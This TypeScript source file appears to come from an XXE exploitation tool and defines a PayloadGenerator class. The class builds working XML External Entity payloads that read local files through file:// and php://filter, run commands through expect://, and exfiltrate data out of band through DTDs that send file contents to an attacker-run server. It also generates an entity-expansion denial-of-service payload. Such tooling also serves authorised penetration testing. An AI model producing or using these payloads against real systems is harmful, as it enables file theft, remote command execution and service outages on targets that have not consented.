import { XXEServer } from "./XXEServer";
import { Handler } from "./Handler";
import { CliUtils } from "./CliUtils";

export interface Entity {
  name: string;
  value: string;
  parameter: boolean;
  system: boolean;
}

export enum Type {
  file = 1, request = 2, expect = 3
}

export enum Mode {
  XML = 1, OOB = 2, CDATA = 3
}

export enum Encoding {
  NORMAL = 1,
  PHP_BASE64 = 2
}

export class PayloadGenerator {

  public static PLACEHOLDER = "{{XXE}}";
  public static PLACEHOLDER_REQUEST_B64 = "{{XXE_B64}}";


  public static DOCTYPE_NAME = "xxexploiter";

  server: XXEServer;
  counter = 0;

  public constructor(serverAddress = "127.0.0.1", serverPort = 7777) {
    this.server = new XXEServer(serverAddress, serverPort);
  }


  public generate(t: Type, mode: Mode, encoding: Encoding, path: string, template: string, doctypeName = PayloadGenerator.DOCTYPE_NAME): string {
    if (!template) template = PayloadGenerator.defaultTemplate(doctypeName);

    let entities: Array<Entity | string> = [];
    const content: string = PayloadGenerator.schema(path, t, encoding);

    switch (mode) {
      case Mode.XML:
        entities = [{ name: "payload", value: content, parameter: false, system: true }];
        break;
      case Mode.CDATA:
        {
          this.counter++; //to generate unique routes
          const cdataDTDContent = PayloadGenerator.generateCdataDTD(content);
          const dtdUrl = this.server.addRoute(`/${this.counter}.dtd`, cdataDTDContent);

          if (Handler.VERBOSE)
            CliUtils.printInfo(`Generated cdata DTD: \n${cdataDTDContent}`);

          entities = [
            { name: "extDTD", value: `${dtdUrl}`, parameter: true, system: true },
            "%extDTD;",
            "%all;"
          ];
          break;
        }
      case Mode.OOB: {

        const extractionEnt = { name: "dataextractionfile", parameter: true, value: content, system: true };
        this.counter++;
        const extractionDTDContent = this.generateExtractionDTD(extractionEnt);
        const extractionDTD = this.server.addRoute(`/${this.counter}.dtd`, extractionDTDContent);

        if (Handler.VERBOSE)
          CliUtils.printInfo(`Generated OOB DTD: \n${extractionDTDContent}`);

        this.server.addExtractionRoute();
        entities = [
          { name: "extDTD", value: extractionDTD, parameter: true, system: true },
          "%extDTD;",
          "%extraction;",
          "%OOB;"];
        break;
      }
    }

    if (mode === Mode.CDATA || mode === Mode.OOB) this.server.start();

    const docType = PayloadGenerator.createDocType(entities, doctypeName);
    const xml = PayloadGenerator.injectDocType(template, docType);

    if (mode === Mode.XML)
      return PayloadGenerator.replacePlaceholderWithEntity(xml, "payload");
    else if (mode === Mode.CDATA)
      return PayloadGenerator.replacePlaceholderWithEntity(xml, "content");
    else
      return PayloadGenerator.replacePlaceholder(xml, "");

  }


  //TODO: need to improve this. 
  //maxNumberOfExpantions should be NumberOfExpantions.
  //JDK has a limit of 64000 expansions :( 
  //TODO: this method should be merged into generate
  public static xee(maxNumberOfExpantions: number, template = "", doctypeName = PayloadGenerator.DOCTYPE_NAME): string {
    if (template === "") template = PayloadGenerator.defaultTemplate(doctypeName);

    const entities = [{
      name: "ent0",
      system: false,
      value: "Ea velit aute anim voluptate aliquip id aute dolore do culpa nisi quis officia sunt quis elit ex sed elit."
    }];

    const b = 10;
    let i = 1;
    let expantions = 1;
    while ((expantions * b) <= maxNumberOfExpantions) {

      const ent = { name: "ent" + i, value: PayloadGenerator.callEntity("ent" + (i - 1)).repeat(b), system: false };
      entities.push(ent);

      i++;
      expantions = expantions * b;
    }


    const docType = PayloadGenerator.createDocType(entities, doctypeName);
    const preXml = PayloadGenerator.injectDocType(template, docType);
    const xml = PayloadGenerator.replacePlaceholderWithEntity(preXml, "ent" + (i - 1));
    return xml;
  }




  private static generateCdataDTD(payloadAction: string): string {

    let payload =
      PayloadGenerator.createEntityString({ name: "start", value: `<![CDATA[`, parameter: true, system: false }) +
      PayloadGenerator.createEntityString({ name: "path", value: payloadAction, parameter: true, system: true }) +
      PayloadGenerator.createEntityString({ name: "end", value: `]]>`, parameter: true, system: false });

    const subEntity = PayloadGenerator.createEntityString({
      name: "content",
      value: `%start;%path;%end;`,
      parameter: false,
      system: false
    }, true);

    payload += PayloadGenerator.createEntityString({ name: "all", value: subEntity, parameter: true, system: false });

    return payload;
  }


  private generateExtractionDTD(entity: Entity): string {
    //TODO: change this. we can now generate this case with createEntityString
    return PayloadGenerator.createEntityString(entity) +
      `<!ENTITY % extraction "<!ENTITY &#x25; OOB SYSTEM '${this.server.getServerUrl()}/?p=%${entity.name};'>">\n`;
  }




  //TODO: allow to change doctype name
  private static createDocType(entities: any, doctypeName: string): string {
    const name = doctypeName || PayloadGenerator.DOCTYPE_NAME;

    let dt = `<!DOCTYPE ${name} [\n`;
    entities.forEach((e: any) => {
      if (typeof e === 'string')
        dt += "   " + e + "\n";
      else
        dt += "   " + PayloadGenerator.createEntityString(e);
    });
    dt += "]>\n";

    return dt;
  }


  //inner param is to know if this entity is inside another
  private static createEntityString(entity: Entity, /*encoding: Encoding = Encoding.NORMAL,*/ inner = false): string {
    let p = " ";
    let system = " ";
    if (entity.parameter) {
      if (inner)
        p = " &#x25; ";
      else
        p = " % ";
    }

    // let val = entity.value;


    // if ((encoding & Encoding.PHP_BASE64) > 0)
    //   val = "php://filter/read=convert.base64-encode/resource=file://" + val;

    if (entity.system)
      system = " SYSTEM ";

    if (inner)
      return `<!ENTITY${p}${entity.name}${system}'${entity.value}'>`;
    else
      return `<!ENTITY${p}${entity.name}${system}"${entity.value}">\n`;

  }

  private static injectDocType(xmlContent: string, docType: string): string {
    if (xmlContent.includes("<?xml")) {
      const startIndex = xmlContent.indexOf("<?xml");
      const endIndex = xmlContent.indexOf(">", startIndex);
      const xmlDcl = xmlContent.substring(startIndex, endIndex + 1);

      return xmlDcl + "\n" + docType + xmlContent.replace(xmlDcl, "");
    }
    else
      return docType + xmlContent;

  }

  private static generateString(): string {
    return Math.random().toString(36).substring(7);
  }

  private static callEntity(entityName: string): string {
    return `&${entityName};`;
  }

  private static defaultTemplate(root: string): string {
    const rootName = root || PayloadGenerator.DOCTYPE_NAME;
    return `<?xml version="1.0" encoding="UTF-8"?>
    <${rootName}>
      <value>{{XXE}}</value>
    </${rootName}>`;
  }

  private static replacePlaceholderWithEntity(xmlPayload: string, entityName: string): string {
    const replaceWith = PayloadGenerator.callEntity(entityName);
    return PayloadGenerator.replacePlaceholder(xmlPayload, replaceWith);
  }

  private static replacePlaceholder(xmlPayload: string, replaceWith: string): string {
    return xmlPayload.replace(PayloadGenerator.PLACEHOLDER, `${replaceWith}`);
  }


  private static schema(value: string, type = Type.file, encode = Encoding.NORMAL): string {

    if (encode === Encoding.PHP_BASE64) {
      if (type === Type.file)
        return `php://filter/read=convert.base64-encode/resource=${value}`;
      else
        return `php://filter/convert.base64-encode/resource=${value}`;
    }

    switch (type) {
      case Type.expect: return `expect://${value}`;
      case Type.file: return `file://${value}`;
      case Type.request: return value;
    }
  }


}